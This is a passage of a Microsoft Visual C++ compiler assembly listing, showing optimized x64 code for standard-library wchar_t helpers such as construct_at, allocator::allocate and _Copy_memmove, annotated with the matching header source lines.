??$construct_at@_W$$V$0A@@std@@YAPEA_WQEA_W@Z PROC	; std::construct_at<wchar_t,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	xor	eax, eax
	mov	WORD PTR [rcx], ax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@_W$$V$0A@@std@@YAPEA_WQEA_W@Z ENDP	; std::construct_at<wchar_t,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z PROC	; std::forward<wchar_t * const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBQEA_W@std@@YAAEBQEA_WAEBQEA_W@Z ENDP	; std::forward<wchar_t * const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@PEA_WAEBQEA_W$0A@@std@@YAPEAPEA_WQEAPEA_WAEBQEA_W@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@PEA_WAEBQEA_W$0A@@std@@YAPEAPEA_WQEAPEA_WAEBQEA_W@Z PROC ; std::construct_at<wchar_t *,wchar_t * const &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, QWORD PTR [rdx]
	mov	QWORD PTR [rcx], rax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@PEA_WAEBQEA_W$0A@@std@@YAPEAPEA_WQEAPEA_WAEBQEA_W@Z ENDP ; std::construct_at<wchar_t *,wchar_t * const &,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX_K@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rcx], xmm0
	mov	QWORD PTR [rcx+16], rax
	ret	0
?__autoclassinit2@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX_K@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
this$ = 8
?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release, COMDAT

; 1785 :         _First = _Last;

	mov	rax, QWORD PTR [rcx+8]
	mov	QWORD PTR [rcx], rax

; 1786 :         return _Last;
; 1787 :     }

	ret	0
?_Release@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Release
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >, COMDAT

; 1775 :         _STD _Destroy_range(_First, _Last, _Al);
; 1776 :     }

	ret	0
??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::~_Uninitialized_backout_al<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 8
_Dest$ = 16
_Al_$ = 24
??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >, COMDAT

; 1769 :     _CONSTEXPR20 _Uninitialized_backout_al(pointer _Dest, _Alloc& _Al_) : _First(_Dest), _Last(_Dest), _Al(_Al_) {}

	mov	QWORD PTR [rcx], rdx
	mov	rax, rcx
	mov	QWORD PTR [rcx+8], rdx
	mov	QWORD PTR [rcx+16], r8
	ret	0
??0?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@PEA_WAEAV?$allocator@_W@1@@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Uninitialized_backout_al<std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Count$ = 56
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 953  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN34:
	sub	rsp, 40					; 00000028H

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	cmp	rdx, rax
	ja	SHORT $LN30@allocate

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rcx, QWORD PTR [rdx+rdx]

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN8@allocate

; 197  :         return nullptr;

	xor	eax, eax

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN8@allocate:

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN10@allocate

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN30@allocate

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN20@allocate

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN10@allocate:
	add	rsp, 40					; 00000028H

; 101  :         return ::operator new(_Bytes);

	jmp	??2@YAPEAX_K@Z				; operator new
$LN30@allocate:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN20@allocate:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@allocate:
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$to_address@_W@std@@YAPEA_WQEA_W@Z
_TEXT	SEGMENT
_Val$ = 8
??$to_address@_W@std@@YAPEA_WQEA_W@Z PROC		; std::to_address<wchar_t>, COMDAT

; 453  :     static_assert(!is_function_v<_Ty>, "N4950 [pointer.conversion]/1: Mandates: T is not a function type.");
; 454  :     return _Val;

	mov	rax, rcx

; 455  : }

	ret	0
??$to_address@_W@std@@YAPEA_WQEA_W@Z ENDP		; std::to_address<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z
_TEXT	SEGMENT
_First$ = 48
_Last$ = 56
_Dest$ = 64
??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z PROC	; std::_Copy_memmove<wchar_t *,wchar_t *>, COMDAT

; 4613 : _OutCtgIt _Copy_memmove(_CtgIt _First, _CtgIt _Last, _OutCtgIt _Dest) {

$LN4:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, r8

; 4614 :     auto _FirstPtr              = _STD _To_address(_First);
; 4615 :     auto _LastPtr               = _STD _To_address(_Last);
; 4616 :     auto _DestPtr               = _STD _To_address(_Dest);
; 4617 :     const char* const _First_ch = const_cast<const char*>(reinterpret_cast<const volatile char*>(_FirstPtr));
; 4618 :     const char* const _Last_ch  = const_cast<const char*>(reinterpret_cast<const volatile char*>(_LastPtr));
; 4619 :     char* const _Dest_ch        = const_cast<char*>(reinterpret_cast<const volatile char*>(_DestPtr));
; 4620 :     const auto _Count           = static_cast<size_t>(_Last_ch - _First_ch);

	sub	rbx, rcx

; 4621 :     _CSTD memmove(_Dest_ch, _First_ch, _Count);

	mov	rdx, rcx
	mov	r8, rbx
	mov	rcx, rdi
	call	memmove

; 4622 :     if constexpr (is_pointer_v<_OutCtgIt>) {
; 4623 :         return reinterpret_cast<_OutCtgIt>(_Dest_ch + _Count);

	lea	rax, QWORD PTR [rbx+rdi]

; 4624 :     } else {
; 4625 :         return _Dest + (_LastPtr - _FirstPtr);
; 4626 :     }
; 4627 : }

	mov	rbx, QWORD PTR [rsp+48]
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z ENDP	; std::_Copy_memmove<wchar_t *,wchar_t *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Emplace_back@AEA_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAXAEA_W@Z
_TEXT	SEGMENT
this$ = 8
<_Vals_0>$ = 16
??$_Emplace_back@AEA_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAXAEA_W@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t &>, COMDAT

; 1780 :         allocator_traits<_Alloc>::construct(_Al, _STD _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	r8, QWORD PTR [rcx+8]
	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [r8], ax

; 1781 :         ++_Last;

	add	QWORD PTR [rcx+8], 2

; 1782 :     }

	ret	0
??$_Emplace_back@AEA_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAXAEA_W@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@_W_W$0A@@std@@YAPEA_WQEA_W$$QEA_W@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@_W_W$0A@@std@@YAPEA_WQEA_W$$QEA_W@Z PROC ; std::construct_at<wchar_t,wchar_t,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@_W_W$0A@@std@@YAPEA_WQEA_W$$QEA_W@Z ENDP ; std::construct_at<wchar_t,wchar_t,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z
_TEXT	SEGMENT
this$ = 8
<_Vals_0>$ = 16
??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z PROC ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>, COMDAT

; 1780 :         allocator_traits<_Alloc>::construct(_Al, _STD _Unfancy(_Last), _STD forward<_Types>(_Vals)...);

	mov	r8, QWORD PTR [rcx+8]
	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [r8], ax

; 1781 :         ++_Last;

	add	QWORD PTR [rcx+8], 2

; 1782 :     }

	ret	0
??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z ENDP ; std::_Uninitialized_backout_al<std::allocator<wchar_t> >::_Emplace_back<wchar_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Get_size_of_n@$01@std@@YA_K_K@Z
_TEXT	SEGMENT
_Count$ = 48
??$_Get_size_of_n@$01@std@@YA_K_K@Z PROC		; std::_Get_size_of_n<2>, COMDAT

; 79   : _NODISCARD constexpr size_t _Get_size_of_n(const size_t _Count) {

$LN7:
	sub	rsp, 40					; 00000028H

; 80   :     constexpr bool _Overflow_is_possible = _Ty_size > 1;
; 81   : 
; 82   :     if constexpr (_Overflow_is_possible) {
; 83   :         constexpr size_t _Max_possible = static_cast<size_t>(-1) / _Ty_size;
; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	cmp	rcx, rax
	ja	SHORT $LN6@Get_size_o

; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rax, QWORD PTR [rcx+rcx]

; 90   : }

	add	rsp, 40					; 00000028H
	ret	0
$LN6@Get_size_o:

; 85   :             _Throw_bad_array_new_length(); // multiply overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN4@Get_size_o:
??$_Get_size_of_n@$01@std@@YA_K_K@Z ENDP		; std::_Get_size_of_n<2>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEA_W@std@@YAAEA_WAEA_W@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEA_W@std@@YAAEA_WAEA_W@Z PROC		; std::forward<wchar_t &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEA_W@std@@YAAEA_WAEA_W@Z ENDP		; std::forward<wchar_t &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$construct@_WAEA_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEA_W@Z
_TEXT	SEGMENT
__formal$dead$ = 8
_Ptr$ = 16
<_Args_0>$ = 24
??$construct@_WAEA_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEA_W@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	movzx	eax, WORD PTR [r8]
	mov	WORD PTR [rdx], ax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 702  :     }

	ret	0
??$construct@_WAEA_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEA_W@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::construct<wchar_t,wchar_t &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@_WAEA_W$0A@@std@@YAPEA_WQEA_WAEA_W@Z
_TEXT	SEGMENT
_Location$ = 8
<_Args_0>$ = 16
??$construct_at@_WAEA_W$0A@@std@@YAPEA_WQEA_WAEA_W@Z PROC ; std::construct_at<wchar_t,wchar_t &,0>, COMDAT

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	mov	rax, rcx

; 376  : }

	ret	0
??$construct_at@_WAEA_W$0A@@std@@YAPEA_WQEA_WAEA_W@Z ENDP ; std::construct_at<wchar_t,wchar_t &,0>
_TEXT	ENDS
END
